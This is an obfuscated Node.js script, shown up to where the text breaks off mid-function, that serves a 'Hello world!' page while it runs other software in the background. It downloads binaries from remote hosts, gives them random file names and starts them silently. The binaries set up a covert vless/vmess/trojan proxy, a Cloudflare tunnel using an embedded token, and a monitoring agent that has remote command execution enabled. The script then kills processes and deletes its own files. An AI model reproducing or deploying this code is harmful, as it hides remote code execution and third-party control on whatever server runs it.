const _0x1e0154=_0x1569;(function(_0x214b71,_0x3caeaa){const _0x485cd7={_0x37dfe8:0x18a,_0x392219:0x1ce,_0xc522c1:0x21e,_0x6c2cc2:0x1de,_0x53d992:0x166,_0x204e18:0x192},_0xf8c06a=_0x1569,_0x2e8782=_0x214b71();while(!![]){try{const _0x112497=-parseInt(_0xf8c06a(_0x485cd7._0x37dfe8))/0x1+-parseInt(_0xf8c06a(0x1e0))/0x2*(-parseInt(_0xf8c06a(_0x485cd7._0x392219))/0x3)+-parseInt(_0xf8c06a(_0x485cd7._0xc522c1))/0x4*(parseInt(_0xf8c06a(_0x485cd7._0x6c2cc2))/0x5)+parseInt(_0xf8c06a(_0x485cd7._0x53d992))/0x6+parseInt(_0xf8c06a(0x1d5))/0x7+-parseInt(_0xf8c06a(0x1f1))/0x8*(parseInt(_0xf8c06a(0x180))/0x9)+parseInt(_0xf8c06a(_0x485cd7._0x204e18))/0xa*(parseInt(_0xf8c06a(0x1d4))/0xb);if(_0x112497===_0x3caeaa)break;else _0x2e8782['push'](_0x2e8782['shift']());}catch(_0x16d41d){_0x2e8782['push'](_0x2e8782['shift']());}}}(_0x3b9b,0x5a9da));const express=require(_0x1e0154(0x1aa)),app=express(),axios=require(_0x1e0154(0x1dd)),os=require('os'),fs=require('fs'),path=require(_0x1e0154(0x218)),{promisify}=require(_0x1e0154(0x1ad)),exec=promisify(require('child_process')[_0x1e0154(0x19c)]),{execSync}=require(_0x1e0154(0x1eb)),UPLOAD_URL=process[_0x1e0154(0x22d)][_0x1e0154(0x1a9)]||'',PROJECT_URL=process['env'][_0x1e0154(0x19b)]||'',AUTO_ACCESS=process[_0x1e0154(0x22d)][_0x1e0154(0x1bb)]||![],FILE_PATH=process['env'][_0x1e0154(0x1ac)]||_0x1e0154(0x195),SUB_PATH=process[_0x1e0154(0x22d)][_0x1e0154(0x1ef)]||_0x1e0154(0x1ba),PORT=process[_0x1e0154(0x22d)][_0x1e0154(0x1fa)]||process['env'][_0x1e0154(0x205)]||0xbb8,UUID=process[_0x1e0154(0x22d)][_0x1e0154(0x1f4)]||_0x1e0154(0x1dc),NEZHA_SERVER=process['env'][_0x1e0154(0x1a6)]||'',NEZHA_PORT=process['env'][_0x1e0154(0x1bf)]||'',NEZHA_KEY=process[_0x1e0154(0x22d)][_0x1e0154(0x194)]||'',ARGO_DOMAIN=process[_0x1e0154(0x22d)][_0x1e0154(0x182)]||_0x1e0154(0x1a2),ARGO_AUTH=process[_0x1e0154(0x22d)][_0x1e0154(0x1fe)]||_0x1e0154(0x223),ARGO_PORT=process[_0x1e0154(0x22d)][_0x1e0154(0x21c)]||0x1f41,CFIP=process['env']['CFIP']||_0x1e0154(0x1e2),CFPORT=process[_0x1e0154(0x22d)]['CFPORT']||0x1bb,NAME=process[_0x1e0154(0x22d)]['NAME']||_0x1e0154(0x1c0);!fs['existsSync'](FILE_PATH)?(fs[_0x1e0154(0x1e3)](FILE_PATH),console[_0x1e0154(0x20d)](FILE_PATH+_0x1e0154(0x187))):console[_0x1e0154(0x20d)](FILE_PATH+_0x1e0154(0x1a4));function generateRandomName(){const _0x8d3592={_0x576aa9:0x1f2},_0x57de0f=_0x1e0154,_0x3860c7=_0x57de0f(0x16f);let _0x5c5654='';for(let _0x3c877e=0x0;_0x3c877e<0x6;_0x3c877e++){_0x5c5654+=_0x3860c7[_0x57de0f(0x17a)](Math['floor'](Math[_0x57de0f(_0x8d3592._0x576aa9)]()*_0x3860c7[_0x57de0f(0x172)]));}return _0x5c5654;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1e0154(0x1f0)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x1e0154(0x1f0)](FILE_PATH,webName),botPath=path[_0x1e0154(0x1f0)](FILE_PATH,botName),subPath=path[_0x1e0154(0x1f0)](FILE_PATH,'sub.txt'),listPath=path[_0x1e0154(0x1f0)](FILE_PATH,_0x1e0154(0x21d)),bootLogPath=path[_0x1e0154(0x1f0)](FILE_PATH,_0x1e0154(0x1e5)),configPath=path['join'](FILE_PATH,_0x1e0154(0x17b));function deleteNodes(){const _0x2f8e03={_0x29a397:0x17d,_0x35d660:0x1a0,_0x14fc2b:0x18c,_0xde79ff:0x172,_0x54dbcb:0x189},_0x6db80=_0x1e0154;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x4ff9f4;try{_0x4ff9f4=fs[_0x6db80(_0x2f8e03._0x29a397)](subPath,_0x6db80(_0x2f8e03._0x35d660));}catch{return null;}const _0x2def9b=Buffer['from'](_0x4ff9f4,_0x6db80(_0x2f8e03._0x14fc2b))[_0x6db80(0x191)](_0x6db80(0x1a0)),_0x1a9eca=_0x2def9b[_0x6db80(0x1f3)]('\x0a')[_0x6db80(0x17f)](_0x24f2fd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x6db80(0x1e7)](_0x24f2fd));if(_0x1a9eca[_0x6db80(_0x2f8e03._0xde79ff)]===0x0)return;return axios[_0x6db80(0x168)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x6db80(0x169)]({'nodes':_0x1a9eca}),{'headers':{'Content-Type':_0x6db80(0x173)}})[_0x6db80(_0x2f8e03._0x54dbcb)](_0x20fe6d=>{return null;}),null;}catch(_0x25a68a){return null;}}function cleanupOldFiles(){const _0x4678c6={_0x13c338:0x1a3},_0x347ff0=_0x1e0154;try{const _0xd79788=fs[_0x347ff0(0x1b9)](FILE_PATH);_0xd79788[_0x347ff0(0x18d)](_0x5baabd=>{const _0x5dd54c=_0x347ff0,_0x4c0af7=path[_0x5dd54c(0x1f0)](FILE_PATH,_0x5baabd);try{const _0x1648f0=fs[_0x5dd54c(_0x4678c6._0x13c338)](_0x4c0af7);_0x1648f0[_0x5dd54c(0x1ab)]()&&fs[_0x5dd54c(0x183)](_0x4c0af7);}catch(_0x15f391){}});}catch(_0x357310){}}app[_0x1e0154(0x198)]('/',function(_0x261a87,_0x5d53b1){_0x5d53b1['send']('Hello\x20world!');});async function generateConfig(){const _0x4ad73e={_0x37e458:0x176,_0x3677e8:0x1ed,_0x47e138:0x216,_0x21bbae:0x176,_0x117d20:0x227,_0x1991d8:0x1a1,_0x1fd72e:0x1e8,_0x3a94e9:0x1ff,_0x41626d:0x188,_0x20763f:0x227,_0x4f76d5:0x212,_0x1a7718:0x1ff,_0x88f8c8:0x22c,_0x8f7365:0x1b2,_0x5860cf:0x1c4,_0x17279e:0x228,_0x255292:0x1c3,_0x5302a9:0x169},_0x3d1bed=_0x1e0154,_0x5c09b3={'log':{'access':'/dev/null','error':_0x3d1bed(0x177),'loglevel':_0x3d1bed(_0x4ad73e._0x37e458)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3d1bed(_0x4ad73e._0x3677e8),'settings':{'clients':[{'id':UUID,'flow':_0x3d1bed(_0x4ad73e._0x47e138)}],'decryption':_0x3d1bed(_0x4ad73e._0x21bbae),'fallbacks':[{'dest':0xbb9},{'path':_0x3d1bed(0x1f8),'dest':0xbba},{'path':_0x3d1bed(_0x4ad73e._0x117d20),'dest':0xbbb},{'path':_0x3d1bed(_0x4ad73e._0x1991d8),'dest':0xbbc}]},'streamSettings':{'network':_0x3d1bed(_0x4ad73e._0x1fd72e)}},{'port':0xbb9,'listen':_0x3d1bed(0x1ff),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x3d1bed(0x176)},'streamSettings':{'network':_0x3d1bed(_0x4ad73e._0x1fd72e),'security':_0x3d1bed(_0x4ad73e._0x37e458)}},{'port':0xbba,'listen':_0x3d1bed(_0x4ad73e._0x3a94e9),'protocol':_0x3d1bed(0x1ed),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3d1bed(0x176)},'streamSettings':{'network':'ws','security':_0x3d1bed(_0x4ad73e._0x37e458),'wsSettings':{'path':_0x3d1bed(0x1f8)}},'sniffing':{'enabled':!![],'destOverride':[_0x3d1bed(0x212),_0x3d1bed(_0x4ad73e._0x41626d),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x3d1bed(0x1c6),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3d1bed(_0x4ad73e._0x20763f)}},'sniffing':{'enabled':!![],'destOverride':[_0x3d1bed(_0x4ad73e._0x4f76d5),'tls',_0x3d1bed(0x22c)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3d1bed(_0x4ad73e._0x1a7718),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3d1bed(_0x4ad73e._0x1991d8)}},'sniffing':{'enabled':!![],'destOverride':[_0x3d1bed(_0x4ad73e._0x4f76d5),_0x3d1bed(_0x4ad73e._0x41626d),_0x3d1bed(_0x4ad73e._0x88f8c8)],'metadataOnly':![]}}],'dns':{'servers':[_0x3d1bed(_0x4ad73e._0x8f7365)]},'outbounds':[{'protocol':_0x3d1bed(_0x4ad73e._0x5860cf),'tag':_0x3d1bed(0x19d)},{'protocol':_0x3d1bed(_0x4ad73e._0x17279e),'tag':_0x3d1bed(_0x4ad73e._0x255292)}]};fs[_0x3d1bed(0x20e)](path[_0x3d1bed(0x1f0)](FILE_PATH,_0x3d1bed(0x17b)),JSON[_0x3d1bed(_0x4ad73e._0x5302a9)](_0x5c09b3,null,0x2));}function getSystemArchitecture(){const _0x1330c5={_0x1d2544:0x1a8,_0x5db9cb:0x1ea},_0x144978=_0x1e0154,_0x679422=os[_0x144978(0x231)]();return _0x679422===_0x144978(_0x1330c5._0x1d2544)||_0x679422===_0x144978(0x174)||_0x679422==='aarch64'?'arm':_0x144978(_0x1330c5._0x5db9cb);}function downloadFile(_0x22adcb,_0x23e0d0,_0x3585d7){const _0xed102={_0xf0625:0x1e3},_0x24c3f3={_0x50b49c:0x19f,_0x5d3cc7:0x1cc,_0x3a216d:0x16b},_0x260053={_0x182f2b:0x20a,_0x221bd0:0x215,_0x51087c:0x16b},_0x510462={_0x23a7e6:0x196,_0x22ac21:0x1b6,_0x556bab:0x226},_0x37aba3=_0x1e0154,_0x1971be=_0x22adcb;!fs['existsSync'](FILE_PATH)&&fs[_0x37aba3(_0xed102._0xf0625)](FILE_PATH,{'recursive':!![]});const _0x33395e=fs['createWriteStream'](_0x1971be);axios({'method':_0x37aba3(0x198),'url':_0x23e0d0,'responseType':_0x37aba3(0x1ee)})['then'](_0x123466=>{const _0x1cb79e={_0x1c5d21:0x196},_0x41b9dd=_0x37aba3;_0x123466[_0x41b9dd(_0x260053._0x182f2b)][_0x41b9dd(_0x260053._0x221bd0)](_0x33395e),_0x33395e['on'](_0x41b9dd(0x193),()=>{const _0x45da2b=_0x41b9dd;_0x33395e['close'](),console['log'](_0x45da2b(_0x510462._0x23a7e6)+path[_0x45da2b(_0x510462._0x22ac21)](_0x1971be)+_0x45da2b(_0x510462._0x556bab)),_0x3585d7(null,_0x1971be);}),_0x33395e['on'](_0x41b9dd(_0x260053._0x51087c),_0x1e201a=>{const _0x1252b5=_0x41b9dd;fs[_0x1252b5(0x203)](_0x1971be,()=>{});const _0x274d24=_0x1252b5(_0x1cb79e._0x1c5d21)+path[_0x1252b5(0x1b6)](_0x1971be)+_0x1252b5(0x19f)+_0x1e201a[_0x1252b5(0x1cc)];console['error'](_0x274d24),_0x3585d7(_0x274d24);});})[_0x37aba3(0x189)](_0x265a9d=>{const _0x45e24a=_0x37aba3,_0x255646=_0x45e24a(0x196)+path[_0x45e24a(0x1b6)](_0x1971be)+_0x45e24a(_0x24c3f3._0x50b49c)+_0x265a9d[_0x45e24a(_0x24c3f3._0x5d3cc7)];console[_0x45e24a(_0x24c3f3._0x3a216d)](_0x255646),_0x3585d7(_0x255646);});}function _0x3b9b(){const _0x322070=['2083','\x20-c\x20\x22','abcdefghijklmnopqrstuvwxyz','from','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','length','application/json','arm64','clear','none','/dev/null','automatic\x20access\x20task\x20added\x20successfully','tunnel.json','charAt','config.json','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','readFileSync','fileUrl','filter','27531anhpfp','php\x20running\x20error:\x20','ARGO_DOMAIN','unlinkSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20-p\x20','org','\x20is\x20created','tls','catch','137644MrnppF','true','base64','forEach','/vmess-argo?ed=2560','/sub.txt\x20saved\x20successfully','status','toString','220BbGlyC','finish','NEZHA_KEY','./tmp','Download\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','get','Error\x20in\x20startserver:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','PROJECT_URL','exec','direct','npm\x20running\x20error:\x20','\x20failed:\x20','utf-8','/trojan-argo','leaflow.geofx.ggff.net','statSync','\x20already\x20exists','taskkill\x20/f\x20/im\x20','NEZHA_SERVER','fileName','arm','UPLOAD_URL','express','isFile','FILE_PATH','util','country_code','ArgoDomain:','substring','rm\x20-rf\x20','https+local://8.8.8.8/dns-query','http\x20server\x20is\x20running\x20on\x20port:','\x20>/dev/null\x202>&1\x20&','web\x20running\x20error:\x20','basename','map','Error\x20downloading\x20files:','readdirSync','phy','AUTO_ACCESS','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','?encryption=none&security=tls&sni=','?security=tls&sni=','NEZHA_PORT','Leaflow','8443','App\x20is\x20running','block','freedom','Empowerment\x20failed\x20for\x20','vmess','Unhandled\x20error\x20in\x20startserver:','platform','win32','existsSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','message','Unknown','1639503lqzOfI','false','match','https://arm64.ssss.nyc.mn/v1','\x0a\x0atrojan://','TunnelSecret','228404kFcNUZ','4106571FmbUvG','https://amd64.ssss.nyc.mn/v1','Add\x20automatic\x20access\x20task\x20faild:\x20','/api/add-subscriptions','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20-c\x20','&path=%2Fvless-argo%3Fed%3D2560#','db095ccb-0ccb-4a25-b689-858a2217d2ff','axios','983435iLMpfY','\x20>\x20nul\x202>&1','2ZneXHp','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','cdns.doon.eu.org','mkdirSync','del\x20/f\x20/q\x20','boot.log','2087','test','tcp','2096','amd','child_process','\x20is\x20running','vless','stream','SUB_PATH','join','1736PAXNiR','random','split','UUID','chmod','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','nohup\x20','/vless-argo','unshift','SERVER_PORT','https://arm64.ssss.nyc.mn/web','listen','https://amd64.ssss.nyc.mn/web','ARGO_AUTH','127.0.0.1','\x0a\x20\x20\x20\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','includes','unlink','https://amd64.ssss.nyc.mn/bot','PORT','\x0aclient_secret:\x20','Skipping\x20adding\x20automatic\x20access\x20task','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','pop','data','Empowerment\x20success\x20for\x20','\x0avless://','log','writeFileSync','countryCode','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Subscription\x20uploaded\x20successfully','http','Error\x20reading\x20boot.log:','.exe\x20>\x20nul\x202>&1','pipe','xtls-rprx-vision','&fp=firefox&type=ws&host=','path','send','\x20-s\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','ARGO_PORT','list.txt','12AfnYou','2053','NEZHA\x20variable\x20is\x20empty,skip\x20running','ARGO_DOMAIN:','/config.json\x20>/dev/null\x202>&1\x20&','eyJhIjoiYzk3ZGQ1MGZmZjQwMzYyZDM3ZmE3YTMwOGYwMTBkMzkiLCJ0IjoiZWRkZWIxZjctZTQxMy00OTQxLTk5M2QtYWRlMTFjZjdmN2NiIiwicyI6IllXUXdaREkxWkRRdE4yRTVaQzAwTnpVeUxUaG1aakF0T1RKaVpEUXhNVE5rWXpKaSJ9','Error\x20executing\x20command:\x20','push','\x20successfully','/vmess-argo','blackhole','https://arm64.ssss.nyc.mn/bot','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','has','quic','env','https://arm64.ssss.nyc.mn/agent','all','pkill\x20-f\x20\x22[','arch','&path=%2Ftrojan-argo%3Fed%3D2560#','1036248ZXLmWf','response','post','stringify','https://amd64.ssss.nyc.mn/agent','error','text/plain;\x20charset=utf-8'];_0x3b9b=function(){return _0x322070;};return _0x3b9b();}async function downloadFilesAndRun(){const _0xb99d02={_0x22048c:0x172,_0x5d9dda:0x20d,_0x335567:0x22f,_0x509772:0x16b,_0x244007:0x1c1,_0x84c3ce:0x1e9,_0x185f95:0x1e6,_0x4d3e13:0x21f,_0x299bab:0x18b,_0x51cbf1:0x1cf,_0x4cc325:0x1d9,_0x3f8457:0x21b,_0x3a0807:0x16e,_0x1fa193:0x181,_0x5a43f1:0x1c1,_0x26cdb3:0x16d,_0x1dbf06:0x202,_0xd8f3c7:0x185,_0x126571:0x22a,_0x2e3cd8:0x20d,_0x4022e0:0x20d,_0x54eb12:0x1d0,_0x58f5f9:0x1d0,_0x3118a1:0x17c,_0xbaaac8:0x20d},_0x2aad35=_0x1e0154,_0x148e83=getSystemArchitecture(),_0x36297c=getFilesForArchitecture(_0x148e83);if(_0x36297c[_0x2aad35(_0xb99d02._0x22048c)]===0x0){console[_0x2aad35(_0xb99d02._0x5d9dda)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x6ba4b=_0x36297c[_0x2aad35(0x1b7)](_0x2e3472=>{return new Promise((_0x452259,_0x5b5f4d)=>{const _0x47881c=_0x1569;downloadFile(_0x2e3472[_0x47881c(0x1a7)],_0x2e3472[_0x47881c(0x17e)],(_0x3d088d,_0x39279c)=>{_0x3d088d?_0x5b5f4d(_0x3d088d):_0x452259(_0x39279c);});});});try{await Promise[_0x2aad35(_0xb99d02._0x335567)](_0x6ba4b);}catch(_0x82ef7e){console[_0x2aad35(_0xb99d02._0x509772)](_0x2aad35(0x1b8),_0x82ef7e);return;}function _0x3b0140(_0x409a9d){const _0x3c22fa={_0x305947:0x1ca,_0x3b18f8:0x1f5},_0x2995af={_0x488aaa:0x16b,_0x1e3560:0x20b,_0x5cff3f:0x191},_0x4e49e8=_0x2aad35,_0x5768ee=0x1fd;_0x409a9d[_0x4e49e8(0x18d)](_0x20d54d=>{const _0xd9f009=_0x4e49e8;fs[_0xd9f009(_0x3c22fa._0x305947)](_0x20d54d)&&fs[_0xd9f009(_0x3c22fa._0x3b18f8)](_0x20d54d,_0x5768ee,_0x18c31e=>{const _0x332834=_0xd9f009;_0x18c31e?console[_0x332834(_0x2995af._0x488aaa)](_0x332834(0x1c5)+_0x20d54d+':\x20'+_0x18c31e):console[_0x332834(0x20d)](_0x332834(_0x2995af._0x1e3560)+_0x20d54d+':\x20'+_0x5768ee[_0x332834(_0x2995af._0x5cff3f)](0x8));});});}const _0x19ce7c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3b0140(_0x19ce7c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1674be=NEZHA_SERVER[_0x2aad35(0x202)](':')?NEZHA_SERVER[_0x2aad35(0x1f3)](':')[_0x2aad35(0x209)]():'',_0x8b071d=new Set(['443',_0x2aad35(_0xb99d02._0x244007),_0x2aad35(_0xb99d02._0x84c3ce),_0x2aad35(_0xb99d02._0x185f95),'2083',_0x2aad35(_0xb99d02._0x4d3e13)]),_0x2ce7f3=_0x8b071d[_0x2aad35(0x22b)](_0x1674be)?_0x2aad35(_0xb99d02._0x299bab):_0x2aad35(_0xb99d02._0x51cbf1),_0x5a7b49=_0x2aad35(0x206)+NEZHA_KEY+_0x2aad35(_0xb99d02._0x4cc325)+NEZHA_SERVER+_0x2aad35(0x197)+_0x2ce7f3+_0x2aad35(_0xb99d02._0x3f8457)+UUID;fs[_0x2aad35(0x20e)](path['join'](FILE_PATH,'config.yaml'),_0x5a7b49);const _0x4b7e68=_0x2aad35(0x1f7)+phpPath+_0x2aad35(_0xb99d02._0x3a0807)+FILE_PATH+_0x2aad35(0x171);try{await exec(_0x4b7e68),console['log'](phpName+_0x2aad35(0x1ec)),await new Promise(_0x21efb2=>setTimeout(_0x21efb2,0x3e8));}catch(_0x168d8a){console['error'](_0x2aad35(_0xb99d02._0x1fa193)+_0x168d8a);}}else{let _0x63d36a='';const _0x4787db=['443',_0x2aad35(_0xb99d02._0x5a43f1),'2096',_0x2aad35(_0xb99d02._0x185f95),_0x2aad35(_0xb99d02._0x26cdb3),_0x2aad35(0x21f)];_0x4787db[_0x2aad35(_0xb99d02._0x1dbf06)](NEZHA_PORT)&&(_0x63d36a='--tls');const _0x3de4fd=_0x2aad35(0x1f7)+npmPath+_0x2aad35(0x21a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2aad35(_0xb99d02._0xd8f3c7)+NEZHA_KEY+'\x20'+_0x63d36a+_0x2aad35(_0xb99d02._0x126571);try{await exec(_0x3de4fd),console[_0x2aad35(_0xb99d02._0x2e3cd8)](npmName+_0x2aad35(0x1ec)),await new Promise(_0x34c6f6=>setTimeout(_0x34c6f6,0x3e8));}catch(_0x3802a5){console['error'](_0x2aad35(0x19e)+_0x3802a5);}}}else console[_0x2aad35(_0xb99d02._0x4022e0)](_0x2aad35(0x220));const _0xd9b1='nohup\x20'+webPath+_0x2aad35(0x1da)+FILE_PATH+_0x2aad35(0x222);try{await exec(_0xd9b1),console['log'](webName+_0x2aad35(0x1ec)),await new Promise(_0x38b2dd=>setTimeout(_0x38b2dd,0x3e8));}catch(_0x24f3cd){console['error'](_0x2aad35(0x1b5)+_0x24f3cd);}if(fs[_0x2aad35(0x1ca)](botPath)){let _0x4e7b57;if(ARGO_AUTH[_0x2aad35(_0xb99d02._0x54eb12)](/^[A-Z0-9a-z=]{120,250}$/))_0x4e7b57=_0x2aad35(0x184)+ARGO_AUTH;else ARGO_AUTH[_0x2aad35(_0xb99d02._0x58f5f9)](/TunnelSecret/)?_0x4e7b57=_0x2aad35(_0xb99d02._0x3118a1)+FILE_PATH+'/tunnel.yml\x20run':_0x4e7b57=_0x2aad35(0x201)+FILE_PATH+_0x2aad35(0x1f6)+ARGO_PORT;try{await exec(_0x2aad35(0x1f7)+botPath+'\x20'+_0x4e7b57+'\x20>/dev/null\x202>&1\x20&'),console[_0x2aad35(_0xb99d02._0xbaaac8)](botName+_0x2aad35(0x1ec)),await new Promise(_0x3891d5=>setTimeout(_0x3891d5,0x7d0));}catch(_0x523b0b){console['error'](_0x2aad35(0x224)+_0x523b0b);}}await new Promise(_0x4d441f=>setTimeout(_0x4d441f,0x1388));}function getFilesForArchitecture(_0x4cfdbd){const _0x1fe417={_0x376e73:0x1fb,_0x1a3875:0x229,_0x59a0e7:0x1fd,_0x48e987:0x1a8,_0x267468:0x22e,_0x18b5d2:0x1f9,_0x476f8b:0x1d1},_0x3bb2c6=_0x1e0154;let _0x572d69;_0x4cfdbd==='arm'?_0x572d69=[{'fileName':webPath,'fileUrl':_0x3bb2c6(_0x1fe417._0x376e73)},{'fileName':botPath,'fileUrl':_0x3bb2c6(_0x1fe417._0x1a3875)}]:_0x572d69=[{'fileName':webPath,'fileUrl':_0x3bb2c6(_0x1fe417._0x59a0e7)},{'fileName':botPath,'fileUrl':_0x3bb2c6(0x204)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3483bf=_0x4cfdbd===_0x3bb2c6(_0x1fe417._0x48e987)?_0x3bb2c6(_0x1fe417._0x267468):_0x3bb2c6(0x16a);_0x572d69[_0x3bb2c6(_0x1fe417._0x18b5d2)]({'fileName':npmPath,'fileUrl':_0x3483bf});}else{const _0x42f287=_0x4cfdbd==='arm'?_0x3bb2c6(_0x1fe417._0x476f8b):_0x3bb2c6(0x1d6);_0x572d69[_0x3bb2c6(0x1f9)]({'fileName':phpPath,'fileUrl':_0x42f287});}}return _0x572d69;}function argoType(){const _0x5a707d={_0x1d3ce2:0x1f0,_0x14df8c:0x179,_0x117480:0x210,_0x3fdc9d:0x19a,_0x1c36a1:0x208,_0x46691a:0x1f0,_0x1545e1:0x20d},_0x412d5e=_0x1e0154;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x412d5e(0x20d)](_0x412d5e(0x1bc));return;}if(ARGO_AUTH[_0x412d5e(0x202)](_0x412d5e(0x1d3))){fs['writeFileSync'](path[_0x412d5e(_0x5a707d._0x1d3ce2)](FILE_PATH,_0x412d5e(_0x5a707d._0x14df8c)),ARGO_AUTH);const _0x2c141b='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x412d5e(_0x5a707d._0x1d3ce2)](FILE_PATH,_0x412d5e(0x179))+_0x412d5e(_0x5a707d._0x117480)+ARGO_DOMAIN+_0x412d5e(_0x5a707d._0x3fdc9d)+ARGO_PORT+_0x412d5e(_0x5a707d._0x1c36a1);fs['writeFileSync'](path[_0x412d5e(_0x5a707d._0x46691a)](FILE_PATH,'tunnel.yml'),_0x2c141b);}else console[_0x412d5e(_0x5a707d._0x1545e1)](_0x412d5e(0x1e1));}async function extractDomains(){const _0x3cc782={_0xd2fbf1:0x20d,_0x3cc334:0x17d,_0x20dd80:0x1f0,_0x5d7287:0x1e5,_0xdee50d:0x1a0,_0x39b377:0x183,_0x352519:0x1e5,_0x1e8408:0x201,_0x1754a8:0x1b4,_0x22a76a:0x20d,_0x52375:0x213},_0x2da8b1={_0xc087e2:0x20a,_0x599f25:0x20a,_0x2a5182:0x20a,_0x23f918:0x1ae,_0x5aa911:0x20a},_0x445bec={_0x33d611:0x1a5,_0xa294d0:0x214,_0x2c2da0:0x230,_0xf78aba:0x1b0},_0x3368a1={_0xe3c4bd:0x225},_0x45f454=_0x1e0154;let _0xa5236f;if(ARGO_AUTH&&ARGO_DOMAIN)_0xa5236f=ARGO_DOMAIN,console[_0x45f454(_0x3cc782._0xd2fbf1)](_0x45f454(0x221),_0xa5236f),await _0x19f660(_0xa5236f);else try{const _0x5a360d=fs[_0x45f454(_0x3cc782._0x3cc334)](path[_0x45f454(_0x3cc782._0x20dd80)](FILE_PATH,_0x45f454(_0x3cc782._0x5d7287)),_0x45f454(_0x3cc782._0xdee50d)),_0x342b1d=_0x5a360d[_0x45f454(0x1f3)]('\x0a'),_0xdf955e=[];_0x342b1d[_0x45f454(0x18d)](_0xbef8b4=>{const _0x54284a=_0x45f454,_0x58caf7=_0xbef8b4['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x58caf7){const _0x45d19b=_0x58caf7[0x1];_0xdf955e[_0x54284a(_0x3368a1._0xe3c4bd)](_0x45d19b);}});if(_0xdf955e['length']>0x0)_0xa5236f=_0xdf955e[0x0],console['log'](_0x45f454(0x1af),_0xa5236f),await _0x19f660(_0xa5236f);else{console[_0x45f454(_0x3cc782._0xd2fbf1)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x45f454(_0x3cc782._0x39b377)](path['join'](FILE_PATH,_0x45f454(_0x3cc782._0x352519)));async function _0x59add1(){const _0x382277=_0x45f454;try{process[_0x382277(0x1c8)]===_0x382277(0x1c9)?await exec(_0x382277(_0x445bec._0x33d611)+botName+_0x382277(_0x445bec._0xa294d0)):await exec(_0x382277(_0x445bec._0x2c2da0)+botName[_0x382277(0x17a)](0x0)+']'+botName[_0x382277(_0x445bec._0xf78aba)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x1944e4){}}_0x59add1(),await new Promise(_0x197f58=>setTimeout(_0x197f58,0xbb8));const _0x16c5d1=_0x45f454(_0x3cc782._0x1e8408)+FILE_PATH+_0x45f454(0x1f6)+ARGO_PORT;try{await exec(_0x45f454(0x1f7)+botPath+'\x20'+_0x16c5d1+_0x45f454(_0x3cc782._0x1754a8)),console[_0x45f454(_0x3cc782._0x22a76a)](botName+'\x20is\x20running'),await new Promise(_0x41a7bf=>setTimeout(_0x41a7bf,0xbb8)),await extractDomains();}catch(_0x973632){console['error']('Error\x20executing\x20command:\x20'+_0x973632);}}}catch(_0x5b1b9a){console['error'](_0x45f454(_0x3cc782._0x52375),_0x5b1b9a);}async function _0x4c56e0(){const _0x1e6c23=_0x45f454;try{const _0x2a1b59=await axios[_0x1e6c23(0x198)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x2a1b59[_0x1e6c23(_0x2da8b1._0xc087e2)]&&_0x2a1b59[_0x1e6c23(0x20a)][_0x1e6c23(0x1ae)]&&_0x2a1b59[_0x1e6c23(_0x2da8b1._0x599f25)]['org'])return 